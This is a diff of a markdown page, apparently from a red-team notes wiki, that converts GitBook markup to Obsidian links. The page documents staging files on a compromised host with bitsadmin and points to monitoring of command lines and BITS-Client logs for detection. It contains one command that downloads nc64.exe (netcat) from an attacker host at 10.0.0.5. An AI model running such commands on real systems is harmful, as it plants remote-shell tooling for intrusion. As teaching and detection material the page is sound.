@@ -6,25 +6,24 @@ description: File upload to the compromised system.
 
 ## Execution
 
-{% code title="attacker@victim" %}
 ```c
+// attacker@victim
 bitsadmin /transfer myjob /download /priority high http://10.0.0.5/nc64.exe c:\temp\nc.exe
 ```
-{% endcode %}
 
-![](../../.gitbook/assets/bits-download.png)
+![[bits-download.png]]
 
 ## Observations
 
 Commandline arguments monitoring can help discover bitsadmin usage:
 
-![](../../.gitbook/assets/bits-cmdline.png)
+![[bits-cmdline.png]]
 
 `Application Logs > Microsoft > Windows > Bits-Client > Operational` shows logs related to jobs, which you may want to monitor as well. An example of one of the jobs:
 
-![](../../.gitbook/assets/bits-operational-logs.png)
+![[bits-operational-logs.png]]
 
 ## References
 
-{% embed url="https://attack.mitre.org/wiki/Technique/T1197" %}
+[attack.mitre.org/wiki/Technique/T1197](https://attack.mitre.org/wiki/Technique/T1197)
 
